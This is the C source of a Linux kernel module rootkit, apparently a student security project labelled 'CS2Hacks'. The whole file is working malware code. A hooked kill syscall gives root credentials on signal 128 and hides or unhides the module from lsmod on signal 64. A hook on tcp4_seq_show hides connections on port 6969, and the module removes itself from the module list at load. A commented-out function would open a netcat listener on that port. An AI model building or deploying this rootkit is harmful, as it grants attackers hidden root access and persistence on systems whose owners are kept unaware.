#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/tcp.h>
#include "ftrace_helper.h"


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Joseph Fabrello");
MODULE_DESCRIPTION("CS2Hacks");
MODULE_VERSION("1.0");


//char hidePid[NAME_MAX];
int short hiddenFromLS = 0;
static struct list_head *prevModule;

//static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
//static asmlinkage long (*orig_getdents)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);



void showLS(void);
void hideLS(void);
void createListener(void);
// Hooks


// orig_kill is the prime means of modifying pids because we can already supply a pid to it
static asmlinkage long hook_kill(const struct pt_regs *regs) {

	void giveRoot(void);
//	pid_t pid = regs->di;
	int sig = regs->si;


	// 64 is hide everything
	// 128 is give me root
	if (sig == 64) {
		// hide netcat listener and module from lsmod
		if (hiddenFromLS == 0) {
			hideLS();
			hiddenFromLS = 1;
			return 0;

		} else {
			showLS();
			hiddenFromLS = 0;
			return 0;

		};

	} else if (sig == 128) {
		// giving root
		giveRoot();
		return 0;
	}



	return orig_kill(regs);

};




// tcp4_seq_show is called continuously so we just check if the port is equal to the one we are listening on and get rid of it
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v) {

	struct inet_sock *is;
	long ret;
	unsigned short port = htons(6969);

	if (v != SEQ_START_TOKEN) {

		is = (struct inet_sock *)v;
		if (port == is->inet_sport || port == is->inet_dport) {
			ntohs(is->inet_sport);
			 ntohs(is->inet_dport);
			return 0;
		}

	}

	ret = orig_tcp4_seq_show(seq,v);
	return ret;

};


void giveRoot(void) {

	struct cred *newRoot;
	newRoot = prepare_creds();

	if (newRoot == NULL) return;

	newRoot->uid.val = newRoot->gid.val = 0;
	newRoot->euid.val = newRoot->egid.val = 0;
	newRoot->suid.val = newRoot->sgid.val = 0;
	newRoot->fsuid.val = newRoot->fsgid.val = 0;

	commit_creds(newRoot);

};


// create a listener on init and hide it straight after
/*void createListener(void) {

	char command[256];
	
	sprintf(command, "nc -lnvp 6969");

	int result = system(command);


};*/



static struct ftrace_hook hooks[] = { 

	HOOK("__x64_sys_kill", hook_kill, &orig_kill),
	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),

};

static int __init start(void) {

	void createlistener(void);
	void hideLS(void);
	int err;

	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "ROOTKIT INSTALLED\n");
	if (err) return err;

	//createListener();
	hideLS();
	return 0;
};


static void __exit exitR(void) {

	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "uninstalled\n");
}

// add rootkit back to list of modules installed
void showLS(void) {

	list_add(&THIS_MODULE->list, prevModule);

};



// remove rootkit from the list of modules installed
void hideLS(void) {

	prevModule = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);

};

module_init(start);
module_exit(exitR);





